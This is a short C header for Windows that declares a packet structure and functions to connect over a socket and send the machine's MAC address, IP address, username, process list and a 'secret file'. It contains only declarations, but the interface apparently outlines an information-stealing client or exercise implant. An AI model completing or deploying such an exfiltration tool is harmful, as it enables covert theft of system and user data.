#pragma once

#include <WinSock2.h>
#include <Windows.h>


typedef struct Packet_T {
	char token[8];
	char type[8];
	char payload[4080];
} PACKET;

PACKET* MakePacket();
SOCKET Connect();
void SendMacAddress(SOCKET s);
void SendIPAddress(SOCKET s);
void SendUsername(SOCKET s);
void SendProcs(SOCKET s);
void SendSecretFile(SOCKET s);